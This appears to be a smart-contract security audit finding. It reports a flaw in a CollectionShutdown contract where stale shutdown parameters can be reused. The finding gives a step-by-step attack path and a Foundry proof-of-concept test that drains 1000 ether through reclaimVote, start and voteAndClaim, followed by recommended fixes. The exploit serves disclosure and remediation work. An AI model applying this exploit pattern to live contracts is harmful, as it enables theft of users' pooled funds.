## Details
When a collection is being shutdown via CollectionShutdown contract, the shutdown parameters are not properly cleaned up, and can be reused to mount an attack on the contract. In particular, a new collection can be created for the same ERC-721 contract, and then a shutdown may be started again via a particular sequence of calls: reclaimVote -> start. As CollectionShutdown indexes all internal datastructures and external operations via the address of the ERC-721 contract, this leads to mixing the outdated shutdown parameters with the parameters of the new collection (in particular the old and the new collection token). Moreover, as attacker's balance of the new collection token is now used instead of the old one, the attacker can claim (via voteAndClaim) much more than was received from the token sale of the old collection, thus draining all contract funds.
The execution logic of certain functions of CollectionShutdown is flawed; in particular:
• Method reclaimVote can be called after the shutdown process started to execute;
• Execution of method start is guarded by the precondition params.shutdownVotes==0, which can be made true by the above function reclaimVote. Besides that, start leaves stale data in CollectionShutdownParams.

Attack Path
1. The attacker creates a collection for some ERC-721 contract
2. The attacker deposits an NFT, and receives 1 ether of collection token
3. The attacker starts collection shutdown from address(1)
4. Shutdown executed normally; some tokens are posted to Sudoswap for sale
5. The attacker buys NFTs for 100 ether
6. The attacker reclaims their vote, to enable starting the shutdown again
7. The attacker creates a new collection for the same ERC-721 contract; a new collection token is created by Locker
8. The attacker deposits an NFT, and receives 1 ether of the new collection token
9. The attacker starts collection shutdown again from address(1); this redirects collection token to the new one in shutdown params
10. The attacker deposits NFTs, and receives 11 ether of the new collection token to address(2)
11. Attacker votes and claims, reusing stale, partially updated shutdown params
12. There were 100 ether received from Sudoswap sale upon the first shutdown. As now the attacker claims with their balance of collectionToken2 == 11 ether, they receive 100 ether * 11 == 1100 ether, thus stealing 1000 ether.
All funds are drained from the CollectionShutdown contract.

## Proof of Concept
Drop this test to CollectionShutdown.t.sol and execute with forge test --match-test test_ReuseShutdownParamsToStealFunds:
```solidity
function test_ReuseShutdownParamsToStealFunds() public {
    // Some initial balance of CollectionShutdown
    vm.deal(address(collectionShutdown), 1000 ether);
    // 1. The attacker creates a collection for some ERC-721 contract (done in the test setup)
    // 2. The attacker deposits an NFT, and receives 1 ether of collection token
    vm.startPrank(address(locker));
    collectionToken.mint(address(1), 1 ether);
    vm.stopPrank();
    // 3. The attacker starts collection shutdown from address(1)
    vm.startPrank(address(1));
    collectionToken.approve(address(collectionShutdown), 1 ether);
    collectionShutdown.start(address(erc721b));
    vm.stopPrank();
    // 4. Shutdown executed normally; some tokens are posted to Sudoswap for sale
    // Mint NFTs into our collection {Locker} and process the execution
    uint[] memory tokenIds = _mintTokensIntoCollection(erc721b, 3);
    collectionShutdown.execute(address(erc721b), tokenIds);
    // Mock the process of the Sudoswap pool liquidating the NFTs for ETH.
    // 5. The attacker buys NFTs for 100 ether
    _mockSudoswapLiquidation(SUDOSWAP_POOL, tokenIds, 100 ether);
    // 6. The attacker reclaims their vote, to enable starting the shutdown again
    vm.startPrank(address(1));
    collectionShutdown.reclaimVote(address(erc721b));
    vm.stopPrank();
    // 7. The attacker creates a new collection for the same ERC-721
    locker.createCollection(address(erc721b), 'Test Collection', 'TEST', 0);
    // Initialize our collection, without inflating `totalSupply` of the {CollectionToken}
    locker.setInitialized(address(erc721b), true);
    // A new collection token is created by Locker
    ICollectionToken collectionToken2 = locker.collectionToken(address(erc721b));
    // 8. The attacker deposits an NFT, and receives 1 ether of the new collection token
    vm.startPrank(address(locker));
    collectionToken2.mint(address(1), 1 ether);
    vm.stopPrank();
    // 9. The attacker starts collection shutdown again from address(1)
    // This redirects collection token to the new one in shutdown params
    vm.startPrank(address(1));
    collectionToken2.approve(address(collectionShutdown), 1 ether);
    collectionShutdown.start(address(erc721b));
    vm.stopPrank();
    // 10. The attacker deposits NFTs, and receives 11 ether of the new collection token to address(2)
    vm.startPrank(address(locker));
    collectionToken2.mint(address(2), 11 ether);
    vm.stopPrank();
    // Get our start balances so that we can compare to closing balances from claim
    uint startBalanceAddress = payable(address(2)).balance;
    // 11. The attacker votes and claims, reusing stale, partially updated shutdown params
    vm.startPrank(address(2));
    collectionToken2.approve(address(collectionShutdown), 11 ether);
    collectionShutdown.voteAndClaim(address(erc721b));
    vm.stopPrank();
    // 12. There were 100 ether received from Sudoswap sale upon the first shutdown.
    // As now attacker claims with the balance of collectionToken2 == 11 ether,
    // they receive 100 ether * 11 == 1100 ether, thus stealing 1000 ether
    assertEq(payable(address(2)).balance - startBalanceAddress, 1100 ether);
}
```

## Recommendation
• Disallow calling reclaimVote at any point in time after the shutdown can be executed.
• In start, properly clean up all CollectionShutdownParams.
Additionally, we recommend for the CollectionShutdown contract to index both internal datastructures and external functions not with the address of an ERC-721 contract, but with the address of a collection token contract. This will help to clearly differentiate between various reincarnations of the same ERC-721 contract as different collections / collection tokens, as well as to enable cleanly shutting down the collection even if some operations are still performed with the ERC-721 tokens.
